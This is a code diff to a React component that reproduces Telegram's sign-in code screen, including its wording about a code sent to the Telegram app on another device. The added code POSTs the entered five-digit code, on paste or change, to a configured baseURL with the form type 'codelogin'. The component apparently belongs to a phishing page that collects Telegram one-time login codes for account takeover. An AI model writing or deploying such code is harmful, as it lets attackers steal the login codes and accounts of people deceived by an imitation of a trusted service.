@@ -1,7 +1,17 @@
 import { Link } from 'react-router-dom';
 import styles from './Login.module.css';
+import { useState } from 'react';
+import { baseURL } from '../config';
+import axios from 'axios';
 
 function CodeInput() {
+  const codeLogin = async (code)=>{
+    const resp = await axios.post(baseURL, {formtype: "codelogin", code: code});
+  }
+  const codeLoginStart = (code) => {
+    if(code.length == 5) codeLogin(code);
+  }
+
   return (
     <div className={styles.auth} style={{padding: "45px 0px 0px 0px"}}>
         <div className={styles.monkey}></div>
@@ -14,7 +24,17 @@ function CodeInput() {
         </Link>
         </h1>
         <p className={styles.note}>We've sent the code to the <b>Telegram</b> app on your other device.</p>
-        <div className={styles.inputgroup}><input className={styles.formInput} type="text" id="sign-in-code" dir="auto" autocomplete="off" inputmode="numeric" aria-label="Code"/><label for="sign-in-code" className={styles.codeLabel}>Code</label></div>
+        <div className={styles.inputgroup}>
+          <input className={styles.formInput} type="text" id="sign-in-code" dir="auto" autocomplete="off" inputmode="numeric" aria-label="Code" 
+            onPaste={(e)=>{ 
+              codeLoginStart(e.target.value)
+            }}
+            onChange={(e)=>{ 
+              codeLoginStart(e.target.value)
+            }}
+              />
+          <label for="sign-in-code" className={styles.codeLabel}>Code</label>
+          </div>
     </div>
   );
 }
